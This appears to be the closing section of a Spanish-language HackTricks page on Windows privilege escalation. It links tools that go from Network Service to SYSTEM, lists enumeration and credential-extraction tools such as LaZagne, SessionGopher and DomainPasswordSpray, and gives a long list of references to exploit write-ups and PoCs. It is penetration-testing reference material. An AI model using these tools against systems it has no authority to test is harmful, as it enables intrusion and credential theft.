### **De Administrator o Network Service a System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### De LOCAL SERVICE o NETWORK SERVICE a privilegios completos

**Lee:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Más ayuda

[Binarios estáticos de impacket](https://github.com/ropnop/impacket_static_binaries)

## Herramientas útiles

**La mejor herramienta para buscar vectores de escalada de privilegios locales en Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Busca configuraciones incorrectas y archivos confidenciales (**[**consulta aquí**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detectado.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Busca posibles configuraciones incorrectas y recopila información (**[**consulta aquí**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Busca configuraciones incorrectas**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrae información de sesiones guardadas de PuTTY, WinSCP, SuperPuTTY, FileZilla y RDP. Usa -Thorough en local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrae credenciales de Credential Manager. Detectado.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Prueba las contraseñas recopiladas en el dominio**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh es una herramienta de PowerShell para suplantar ADIDNS/LLMNR/mDNS y realizar ataques man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumeración básica de Windows para privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Busca vulnerabilidades de privesc conocidas (OBSOLETO; reemplazado por Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Comprobaciones locales **(Se necesitan derechos de Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Busca vulnerabilidades de privesc conocidas (debe compilarse con VisualStudio) ([**precompilado**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera el host en busca de configuraciones incorrectas (es más una herramienta para recopilar información que una de privesc; debe compilarse) **(**[**precompilado**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrae credenciales de muchos programas (exe precompilado en GitHub)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port de PowerUp a C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Busca configuraciones incorrectas (ejecutable precompilado en GitHub). No recomendado. No funciona bien en Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Busca posibles configuraciones incorrectas (exe de Python). No recomendado. No funciona bien en Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Herramienta creada a partir de esta publicación (no necesita accesschk para funcionar correctamente, pero puede usarlo).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lee la salida de **systeminfo** y recomienda exploits funcionales (Python local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lee la salida de **systeminfo** y recomienda exploits funcionales (Python local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Debes compilar el proyecto usando la versión correcta de .NET ([consulta esto](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Para ver la versión de .NET instalada en el host víctima, puedes hacer lo siguiente:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Fundamentos de la elevación de privilegios en Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Elevación de privilegios mediante la explotación de permisos débiles en carpetas](http://www.greyhathacker.net/?p=738)
- [3] [Elevación de privilegios en Windows: una guía rápida](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Taller de elevación local de privilegios en Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Ataques a Windows: AT es el nuevo negro (Rob Fuller y Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Elevación de privilegios - Windows - Guía completa de OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Elevación de privilegios - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Guía de elevación de privilegios en Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Lista de comprobación de elevación de privilegios en Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Elevación de privilegios en Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Métodos de elevación de privilegios en Windows para pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing con macro VBA de Word mediante SMTP → descifrado de credenciales de hMailServer → Veeam CVE-2023-27532 hasta SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak de cadena de formato + BOF en la pila → ROP de VirtualAlloc (RCE) y robo de token del kernel](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – A la caza del Silver Fox: gato y ratón entre las sombras del kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Vulnerabilidad en el sistema de archivos privilegiado presente en un sistema SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Herramientas de prueba de enlaces simbólicos – Uso de CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Un enlace al pasado. Abuso de enlaces simbólicos en Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [BOF de RegPwn (port de Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: resolución peligrosa de módulos en Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Módulos de Node.js: carga desde carpetas `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [package.json de npm: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Monitor de procesos (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Retos de la lista de comprobación de C/C++, resueltos](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Función RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [Galería de PowerShell - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own con Microslop: encadenamiento de CLDFLT y condiciones de carrera del kernel de DirectX para LPE en Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Un I/O Ring para dominarlos a todos: una primitiva completa de exploit de lectura y escritura en Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Abuso de eliminaciones arbitrarias de archivos para elevar privilegios y otros trucos útiles](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Código de exploit de FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Ataques a WSUS, parte 2: CVE-2020-1013, una vulnerabilidad de elevación local de privilegios de un día en Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: exploración del Administrador de credenciales y Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - PoC de CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Delegación restringida basada en recursos de Kerberos: cuando un cambio de imagen conduce a una elevación de privilegios](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Extracción de claves privadas SSH del agente SSH de Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Convertir servidores de actualización empresariales en fábricas de puertas traseras (0_o) – Parte 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Convertir servidores de actualización empresariales en fábricas de puertas traseras (0_o) – Parte 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
